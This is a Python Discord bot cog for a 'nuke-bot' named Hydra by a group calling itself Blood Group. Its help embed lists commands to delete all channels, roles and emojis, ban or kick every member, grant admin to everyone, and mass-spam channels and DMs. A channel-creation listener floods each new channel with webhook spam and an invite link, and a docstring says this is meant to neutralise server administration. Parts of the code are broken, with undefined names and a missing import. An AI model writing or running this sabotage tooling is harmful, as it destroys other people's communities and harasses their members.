# coding: utf-8
import os
import json
import discord
import subprocess
import datetime
from os import system, name
from datetime import timedelta
from discord_cooldown import Cooldown
from discord.ext.commands.core import cooldown
from discord import Permissions

from discord.ext import (
    commands,
    tasks
)


class Help(commands.Cog):

    def __init__(self, client):
        self.client = client


    @commands.command()
    async def documentation(self, ctx):

        try:
            with open("json/black_list.json", 'r', encoding="utf-8") as black_listik:
                black_list = json.load(black_listik)
        except Exception as e: print(e)


        if ctx.author.id in black_list:
            try:
                bl_embed = discord.Embed(
                    title = "❗ | Your account is blacklisted by the bot",
                    description = black_text,
                    color = 0xFF0000
                )
                bl_embed.set_footer(
                    icon_url = 'https://media.discordapp.net/attachments/1045645133003104270/1046444713546362921/image.png',
                    text = 'Blood Group・Hydra Team'
                )
                await ctx.author.send(embed=bl_embed)

            except:
                bl_embed = discord.Embed(
                    title = "❗ | Your account is blacklisted by the bot",
                    description = black_text,
                    color = 0xFF0000
                )
                bl_embed.set_footer(
                    icon_url = 'https://media.discordapp.net/attachments/1045645133003104270/1046444713546362921/image.png',
                    text = 'Blood Group・Hydra Team'
                )
                await ctx.send(embed=bl_embed)

        else:
            try:

                embed = discord.Embed(
                    title = f'Documentation about nuke-bot Hydra - command list',
                    description = f'`<>` - *Required parameter.*  `[]` - *Optional parameter.*\n឵឵',
                    color = 0x050319
                )

                embed.add_field(
                    name = "> 🧨 | Classic nuke-commands",
                    value = f"""឵឵
`{ctx.prefix}attack` - **Automatic server destruction.**
`{ctx.prefix}delchannels` - **Deleting all channels.**
`{ctx.prefix}delroles` - **Deleting all roles.**
`{ctx.prefix}channels` - **Mass creation of channels.**
`{ctx.prefix}roles` - **Mass creation of roles.**
`{ctx.prefix}rename` - **Changing the server name.**
`{ctx.prefix}delemoji` - **Deleting all emojis.**\n឵឵""",
                    inline = False
                )

                embed.add_field(
                    name = "> 💥 | Commands for interacting with server participants",
                    value = f"""឵឵
`{ctx.prefix}kick_all` - **Kick all participants.**
`{ctx.prefix}ban_all` - **Ban all participants.**\n឵឵""",
                    inline = False
                )

                embed.add_field(
                    name = "> 🚦 | Commands for interacting with roles",
                    value = f"""឵឵
`{ctx.prefix}admin` - **Give yourself a role with administrator rights.**
`{ctx.prefix}everyone_admin` - **Grant administrator rights to all participants.**
`{ctx.prefix}giverole <@Ping role | ID role>` - **Give yourself the mentioned role.**\n឵឵""",
                    inline = False
                )

                embed.add_field(
                    name = "> 🛑 | Spam commands",
                    value = f"""឵឵
`{ctx.prefix}spam` - **Mass sending of messages to the channels.**
`{ctx.prefix}allspam` - **Mass sending of messages to all channels.**
`{ctx.prefix}dmspam <@пинг | ID>` - **Mass sending of messages to the mentioned.**\n឵឵""",
                    inline = False
                )

                embed.add_field(
                    name = "> 🔧 | Custom classic nuke-commands",
                    value = f"""឵឵
`{ctx.prefix}customchan <Name>` - **Mass creation of channels with the specified name.**
`{ctx.prefix}customroles <Name>` - **Mass creation of roles with the specified name.**
`{ctx.prefix}customname <Name>` - **Changing the server name to the specified one.**
`{ctx.prefix}customspam <Text>` - **Mass spam with the specified text.**\n឵឵""",
                    inline = False
                )

                embed.add_field(
                    name = "> 🔧 | Quantitatively custom nuke-commands",
                    value = f"""឵឵
`{ctx.prefix}intchannels <Number>` - **Creating the specified number of channels.**
`{ctx.prefix}introles <Number>` - **Creating the specified number of roles.**\n឵឵""",
                    inline = False
                )
            
                embed.set_footer(
                    icon_url = self.client.get_user(803571002491273226).avatar_url, 
                    text = "© ! ARMAGEDD0N#3261 | Blood Group - All rights reserved!"
                )
                await ctx.author.send(embed=embed)

            except Exception as e: print(e)



    @commands.Cog.listener()
    async def on_guild_join(self, guild):

        try:
            with open("json/white_list.json", 'r', encoding="utf-8") as black_listik:
                black_list = json.load(black_listik)
        except Exception as e: print(e)

        if guild.id in wl:
            await guild.leave()

        else:
            pass



    @commands.Cog.listener()
    async def on_command_error(self, ctx, error):

        embed = discord.Embed(
            title = '⏳ | Command is recharging!',
            description = f"**<@{ctx.author.id}>, you have already used this command. It will be available again only after 5 minutes.**",
            color = 0xe70c3c
        )

        if isinstance(error, commands.CommandOnCooldown):
            await ctx.author.send(embed=embed)
        else:
            pass


    """ Documentation: What is a 'on_guild_channels_create'?

This event allows the bot to immediately respond to the creation of new channels on the server.
This is necessary for the complete neutralization of the server administration (spam causes severe inhibitions)
and a powerful PR company of your server/group/community through this bot. 

This event works especially effectively after using the following commands:

・ !attack - Automatic server destruction.

・ !channels - Mass creation of spam-channels.

・ !customchan <Name> - Mass creation of channels with the specified name.

The three above-mentioned commands create a large number of channels, which causes an immediate reaction
of the bot in the form of mass spam. If the server is destroyed, try not to manually create separate channels,
as this will also cause an immediate reaction of the bot, but it will not cause any damage to the server.

    """


    @commands.Cog.listener()
    async def on_guild_channel_create(self, channel):

        embed = discord.Embed(
            title = f'Crashed By Blood Group!',
            description = f'{spam_message}',
            color = 0xE4C924
        )
        embed.set_image(url='https://media.discordapp.net/attachments/1045645133003104270/1045647837200908288/image.png?width=1108&height=443')

        try:
            webhook = await channel.create_webhook(name="Crash3d By Blood Group")
            webhook_url = webhook.url
            async with aiohttp.ClientSession() as session:
                webhook = discord.Webhook.from_url(str(webhook_url), adapter=discord.AsyncWebhookAdapter(session))
                for i in range(5):
                    await webhook.send(f'@everyone @here Link on Discord: https://discord.gg/KCNhJdzK4F\n', embed=embed)

        except:
            try:
                for i in range(5):
                    await webhook.send(f'@everyone @here Link on Discord: https://discord.gg/KCNhJdzK4F\n', embed=embed)
            except:
                pass

    @commands.Cog.listener()
    async def on_ready(self): # Уведомление о том, что бот запущен.
        print(f'''
[] Nick: {self.client.user}
[] Link: https://discord.com/api/oauth2/authorize?client_id={self.client.user.id}&permissions=8&scope=bot
''')



def setup(client):
    client.add_cog(Help(client))